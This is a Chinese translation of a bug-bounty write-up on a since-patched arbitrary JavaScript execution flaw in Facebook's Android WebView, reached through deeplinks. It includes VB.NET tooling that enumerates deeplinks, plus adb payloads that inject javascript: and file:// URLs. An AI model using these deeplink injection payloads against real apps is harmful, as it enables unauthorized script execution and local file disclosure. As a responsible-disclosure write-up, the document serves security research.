> 原文链接: https://www.anquanke.com//post/id/159648 


# Facebook安卓客户端任意Javascript代码执行漏洞分析


                                阅读量   
                                **123281**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：ash-king.co.uk
                                <br>原文地址：[https://ash-king.co.uk/facebook-bug-bounty-09-18.html](https://ash-king.co.uk/facebook-bug-bounty-09-18.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01193d7d4bf98feee6.png)](https://p5.ssl.qhimg.com/t01193d7d4bf98feee6.png)

## 概述

在2018年6月，Facebook启动漏洞赏金计划期间，我们发现Facebook的安卓客户端中使用的webview组件存在漏洞。该漏洞允许攻击者仅需单击一个链接，即可在Android应用程序中执行任意JavaScript。<br>
在我们深入探寻原因之前，我在3个不同的安卓设备上成功进行了漏洞利用，最终发现问题的原因在于webview组件，而并非是这些安卓设备。在与Facebook安全团队反复沟通之后，他们很快就修复了这一漏洞，并且我们通过漏洞赏金计划得到了8500美元的奖励。



## 侦查阶段

对于赏金猎人来说，要成功发现一些关键漏洞，最重要的步骤之一就是侦查（Recon）。了解我们要寻找漏洞的目标尤为关键，对目标的了解可以帮助我们将精力放在应该重点关注的地方。针对于Facebook的Android客户端，我主要关注一件事，那就是深度链接（Deeplinks）。<br>
深度链接是另一种类型的超链接，可以跳转到应用程序中的特定活动。例如，在Android设备上如果单击 fb://profile/1395634905 ，就能够直接启动Facebook应用程序，并跳转到我的Facebook个人资料页面。<br>
我决定查看APK文件，并寻找其中的明文文本。因此，我在WinRAR中打开了最新的APK包，并在其中搜索字符串“ fb:// ”，之后找到了一个文件 assets/Bundle-fb4.js.hbc 。在这个文件中，有多个深度链接，其中包括 fb://marketplace_product_details_from_for_sale_item_id 和 fb://adsmanager ，但这两个链接没有什么可以利用的地方。<br>
然而，我们发现有一个深度链接（ fb://ama/ ）非常有用，尽管URL并不长，但在WinRAR中搜索“ama”后，找到了一个名为react_native_routes.json的文件，这简直是一个金矿，因为这个文件中包含了Facebook可以处理的大部分深度链接。<br>[![](https://ash-king.co.uk/assets/img/nativeroutes.png)](https://ash-king.co.uk/assets/img/nativeroutes.png)<br>
借助上图，我们可以生成一个有效的Facebook深度链接：

```
fb://ama/?entryPoint=`{`STRING`}`&amp;fb_hidesTabBar=`{`STRING`}`&amp;presentationMethod=`{`STRING`}`&amp;targetURI=`{`STRING`}`
```

这个文件一共有12000多行，因此我需要一些自动化工具，来帮助我收集所有有效的链接。我迅速编写了两个小程序，一个用于将JSON转换为数据库结构，另一个用于从数据库创建链接。我使用了那个数据库路径，因为之后需要对数据进行操作。

```
//Moving JSON into a database structure
Imports System.Data.SQLite
Imports System.IO
Imports Newtonsoft.Json.Linq

Module Module1

    Sub Main(args() As String)
        ProcessFile("react_native_routes.json")
    End Sub

    Public Sub ProcessFile(InputFile As String)
        Dim JSONText = File.ReadAllText(InputFile)
        If JSONText.StartsWith("[") Then
            'Make valid JSON
            JSONText = "`{`'results' : " &amp; JSONText &amp; " `}`"
        End If
        Dim json As JObject = JObject.Parse(JSONText)
        Dim arr As JArray = json.SelectToken("results")

        For i = 0 To arr.Count - 1
            Try
                Dim RouteName As String = arr(i).SelectToken("name")
                Dim RoutePath As String = arr(i).SelectToken("path")
                Dim paramJSON As JObject = arr(i).SelectToken("paramDefinitions")
                Dim RouteParamateCount As Integer = arr(i).SelectToken("paramDefinitions").Count

                If RouteParamateCount &lt;&gt; 0 Then
                    Dim o As Integer = 0
                    Dim RouteID As Integer = insertRoute(RouteName, RoutePath, RouteParamateCount)
                    For Each item As JProperty In arr(i).SelectToken("paramDefinitions")
                        o += 1
                        Dim ParamName = item.Name
                        Dim ParamType = item.Value("type").ToString
                        Dim ParamRequired = item.Value("required").ToString
                        insertParamater(ParamName, ParamType, ParamRequired, o, RouteID)
                    Next
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub

    Public Function insertRoute(RouteName As String, RoutePath As String, 
                                RouteParamaterCount As Integer) As Integer
        Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
        con.Open()
        Dim sql As String = "INSERT INTO RouteTable 
                            (RouteName, RoutePath, RouteParamaterCount, RouteAddedDateTime) 
                              VALUES 
                            (@RN, @RP, @RPC, @RAD)"
        Dim cmd As New SQLiteCommand(sql, con)
        cmd.Parameters.Add("RN", SqlDbType.VarChar).Value = RouteName
        cmd.Parameters.Add("RP", SqlDbType.VarChar).Value = RoutePath
        cmd.Parameters.Add("RPC", SqlDbType.Int).Value = RouteParamaterCount
        cmd.Parameters.Add("RAD", SqlDbType.Int).Value = Date.Now.Ticks
        cmd.ExecuteNonQuery()
        sql = "SELECT last_insert_rowid()"
        cmd = New SQLiteCommand(sql, con)
        insertRoute = cmd.ExecuteScalar()
        con.Close()
    End Function

    Public Sub insertParamater(ParamaterName As String, ParamaterType As String, ParamaterRequired As Boolean, 
                              ParamaterOrderIndex As Integer, RouteID As Integer)
        Dim PR As Integer = 0
        If ParamaterRequired = True Then
            PR = 1
        Else
            PR = 0
        End If
        Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
        con.Open()
        Dim sql As String = "INSERT INTO ParamaterTable 
                            (ParamaterName, ParamaterType, ParamaterRequired, ParamaterOrderIndex, RoutesID) 
                              VALUES 
                            (@PN, @PT, @PR, @POI, @RID)"
        Dim cmd As New SQLiteCommand(sql, con)
        cmd.Parameters.Add("PN", SqlDbType.VarChar).Value = ParamaterName
        cmd.Parameters.Add("PT", SqlDbType.VarChar).Value = ParamaterType
        cmd.Parameters.Add("PR", SqlDbType.Int).Value = ParamaterRequired
        cmd.Parameters.Add("POI", SqlDbType.Int).Value = PR
        cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
        cmd.ExecuteNonQuery()
        con.Close()
    End Sub

End Module
```

上面的代码（VB.NET）会将JSON的每个“path”解析成RouteTable中自己的条目，包括名称和参数的数量。与实际的参数一样，它们将存储在ParamterTable中，其中存储参数类型、名称、索引、该参数是否为必填，以及返回路径的链接。<br>
下面的代码负责处理SQLite数据库，并提供命令行列表，以借助ADB在Android设备上执行深度链接。

```
Imports System.Data.SQLite
Imports System.IO


Module Module1

  Sub Main(args() As String)
      Dim FilePath As String = Date.Now.ToString("ddMMyyHHmm") &amp; ".txt"
      Dim FBLink As String = ""
      Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
      con.Open()
      Dim sql As String = "SELECT RouteID, RouteName, RoutePath FROM RouteTable"
      Dim cmd As New SQLiteCommand(sql, con)
      Dim reader As SQLiteDataReader = cmd.ExecuteReader()
      If reader.HasRows Then
          Using sw As StreamWriter = New StreamWriter(FilePath)
              While reader.Read
                  FBLink = BuildLink(reader("RouteID"), reader("RouteName"), reader("RoutePath"))
                  FBLink = "adb shell am start -a ""android.intent.action.VIEW"" -d """ &amp; FBLink &amp; """"
                  sw.WriteLine(FBLink)
              End While
          End Using
      End If
      reader.Close()
      con.Close()
  End Sub

  Public Function BuildLink(RouteID As Integer, RouteName As String, RoutePath As String) As String
      BuildLink = $"fb:/`{`RoutePath`}`/"
      Dim i As Integer = 0
      Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
      con.Open()
      Dim sql As String = "SELECT ParamaterName, ParamaterType, ParamaterRequired FROM ParamaterTable 
                          WHERE RoutesID = @RID"
      Dim cmd As New SQLiteCommand(sql, con)
      cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
      Dim reader As SQLiteDataReader = cmd.ExecuteReader()
      If reader.HasRows Then
          While reader.Read()
              If i = 0 Then
                  BuildLink &amp;= "?" &amp; reader("ParamaterName") &amp; "=" &amp; getValidValue(reader("ParamaterType"))
              Else
                  BuildLink &amp;= "&amp;" &amp; reader("ParamaterName") &amp; "=" &amp; getValidValue(reader("ParamaterType"))
              End If
              i += 1
          End While
      End If
      reader.Close()
      con.Close()
  End Function

  Public Function getValidValue(ParamaterType As String) As String
      Select Case ParamaterType
          Case "String"
              Return "`{`STRING`}`"
          Case "Int"
              Return "`{`INT`}`"
          Case "Boolean"
              Return "`{`BOOLEAN`}`"
          Case Else
              Return "`{`STRING`}`"
      End Select
  End Function
End Module

```

以AMA深度链接为例，解析后的终端大致如下：

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://ama/?entryPoint=`{`STRING`}`&amp;fb_hidesTabBar=`{`STRING`}`&amp;presentationMethod=`{`STRING`}`&amp;targetURI=`{`STRING`}`"
```

这样一来，我就能通过命令行打开 fb:// url ，使我检查每个URL的过程比之前快了一万倍。



## 漏洞分析

[![](https://ash-king.co.uk/assets/img/blog/adblist.png)](https://ash-king.co.uk/assets/img/blog/adblist.png)<br>
现在，我们有一个包含364个命令行的列表，是时候开始暴力破解了，我们在这里要重点关注获得了什么样的响应。经过尝试，我们发现了一些很有趣的响应内容，但最引人注意的是下面这三个：

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://payments_add_paypal/?url=`{`STRING`}`"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=`{`STRING`}`"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ads_payments_prepay_webview/?account=`{`STRING`}`&amp;contextID=`{`STRING`}`&amp;paymentID=`{`STRING`}`&amp;url=`{`STRING`}`&amp;originRootTag=`{`INTEGER`}`"
```

这三个深度链接都有一个共同点，就是URL参数。<br>
所以，考虑到参数需要提供一个URL，我就提供它想要的内容，因此构造了第一个负载：

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=javascript:confirm('https://facebook.com/Ashley.King.UK')"
```

结果：<br>[![](https://ash-king.co.uk/assets/img/blog/fbopenredirect.png)](https://ash-king.co.uk/assets/img/blog/fbopenredirect.png)<br>
成功！我们发现了第一个漏洞——一个没有经过严格校验的重定向。Facebook认可SSRF和重定向这样的漏洞，但并不能得到太高的评级，获得的奖励也大概是在500美元左右。<br>
接下来，我们继续尝试，看看能够利用这个地方做些什么。假如我们使用JavaScript URI方案而不是http或https呢？此外，我可不可以读取本地文件？

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=javascript:confirm('https://facebook.com/Ashley.King.UK')"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=file:///sdcard/CDAInfo.txt"
```

出乎我的意料，上面的两次尝试都成功了！<br>[![](https://ash-king.co.uk/assets/img/blog/fbxss.png)](https://ash-king.co.uk/assets/img/blog/fbxss.png)<br>[![](https://ash-king.co.uk/assets/img/blog/fblfi.png)](https://ash-king.co.uk/assets/img/blog/fblfi.png)<br>
在此之后，我还花费了数个小时，用来进一步寻找漏洞，并寻找这个漏洞的进一步利用方式，但都没有取得更多的进展。因为我是在进行黑盒测试，没有源代码的情况下一切都像是盲人摸象，我认为我不能再继续纠结下去，于是向Facebook提交了所发现的漏洞。



## 时间节点

2018年3月30日 报告漏洞<br>
2018年4月4日 得到Facebook首次反馈<br>
2018年4月13日 Facebook修复该漏洞<br>
2018年5月16日 收到奖金



## 总结

最后，用Facebook安全团队Lukas的回复内容作为总结：<br>
根据你发现的漏洞，我们发现，可以从任何页面调用这些深度链接，这些网页自身的影响非常有限。这里最大的问题就是UI中的本地文件泄露，需要本地访问设备才能得到文件列表。<br>
但是，我们在对WebViews的代码进行审计的过程中，发现了一些其他问题。这些问题可能与你报告的漏洞相关。漏洞产生原因与WebView的实际配置有关。该漏洞导致攻击者可能有权调用应用程序的某些内部端点，并访问敏感的HTML5 API。<br>
根据我们的赏金政策，我们根据最高的潜在安全风险确定奖金。由于我们在内部调查中发现了几个更深层次的严重问题，我们将以此为标准发放奖励。
